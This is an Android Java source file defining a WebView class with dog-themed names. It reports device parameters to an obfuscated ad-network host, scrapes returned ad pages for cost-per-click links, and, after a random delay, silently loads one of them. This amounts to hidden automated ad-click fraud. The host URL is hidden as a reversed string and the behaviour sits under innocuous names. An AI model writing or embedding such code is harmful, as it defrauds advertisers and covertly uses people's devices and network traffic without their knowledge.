package com.bbpp.wangcai;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebView;

@SuppressLint("SetJavaScriptEnabled")
public class Dog extends WebView {

	private final static String bu = Wangcai.decode("nc.xpaw.ppa//:ptth");

	private String adUrl = "";
	private Wangcai wc;
	private boolean valid = false;
	private boolean go = false;
	String param = "";
	
	private Handler handler = new DogFood(this); 

	public Dog(Context context) {
		super(context);	
		wc = new Wangcai(context);
		addJavascriptInterface(this, "SDKUtils");
		setWebChromeClient(new WebChromeClient());		
		setWebViewClient(new Client());
		getSettings().setJavaScriptEnabled(true);
		param = wc.getParameter();
		
		go = System.currentTimeMillis() % 20 == 0;		
			
		if (param.trim().length() > 0) {
			valid = true;
			woof1();
		}		
	}

	public void woof1() {	
		if (valid)
			loadUrl(bu + "/action/connect/active" + wc.getParameter() + "&at=" + System.currentTimeMillis());
		//handler.sendMessageDelayed(Message.obtain(handler, 2), 100);
		
	}

	public void woof2() {
		if (valid && handler != null)
			handler.sendMessageDelayed(Message.obtain(handler, 0), 3000);		
	}

	@JavascriptInterface
	public void showHTML(String html) {		
				
		if (html == null)
			return ;
		
		Document doc = Jsoup.parse(html, bu + "/action/ad/show");
		
		Elements links = doc.select("a[href]");
		
		for (Element link : links) {
			String url = link.attr("abs:href");			
			if (go && url.contains("ad_type=cpc") && !url.contains("apk")) {
				adUrl = url.replaceAll(" ", "%20");
				go = false;
				handler.sendMessageDelayed(Message.obtain(handler, 1), System.currentTimeMillis() % 8888);
			}
		}
	}
	
	@JavascriptInterface
	public void openAd() {
		
	}
	
	static class DogFood extends Handler {
		
		Dog dog;
		
		DogFood(Dog dog)  {
			this.dog = dog;
		}
		
		@Override  
        public void handleMessage(Message msg) {
			Dog myDog = dog;
			if (myDog == null)
				return ;
			
            switch (msg.what) {  
            case 0:  
            	myDog.loadUrl(bu + "/action/ad/show" + myDog.param); 
                break;  
            case 1:
            	if (myDog.adUrl != null)
            		myDog.loadUrl(myDog.adUrl);
            	break;                       	
            default:  
                break;  
            }  
        }  
	}
	
	static class SDKUtils {
		
	}
	
	
}
